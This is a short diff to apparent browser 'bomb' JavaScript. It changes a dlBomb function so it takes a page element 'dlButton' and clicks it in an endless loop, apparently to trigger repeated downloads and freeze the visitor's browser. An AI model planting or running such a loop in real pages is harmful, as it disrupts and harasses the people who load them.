@@ -22,9 +22,7 @@ function divBomb() {
 }
 
 function dlBomb() {
-  var button = document.createElement('button')
-  button.setAttribute('href', 'fakeFilePath');
-  button.setAttribute('download', 'fakeFileName');
+  var button = document.getElementById('dlButton')
   while(true) {
     button.click();
   } 
